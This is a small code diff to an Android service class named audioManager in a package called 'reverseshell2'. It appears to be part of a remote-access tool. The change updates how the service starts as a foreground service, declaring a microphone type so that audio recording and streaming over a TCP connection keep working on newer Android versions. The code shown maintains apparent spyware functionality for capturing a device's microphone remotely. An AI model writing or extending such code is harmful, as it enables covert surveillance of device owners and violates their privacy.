@@ -12,6 +12,7 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
+import com.example.reverseshell2.ForegroundCompat;
 import com.example.reverseshell2.R;
 import com.example.reverseshell2.functions;
 import com.example.reverseshell2.tcpConnection;
@@ -42,7 +43,8 @@ public class audioManager extends Service {
                     .setSmallIcon(R.drawable.ic_launcher_foreground)
                     .setProgress(0,0,true)
                     .build();
-            startForeground(4321, notification);
+            ForegroundCompat.start(
+                    this, 4321, notification, ForegroundCompat.typeMicrophone());
             startRecording(tcpConnection.out);
         }
         if(ins.equals("stopFore")){
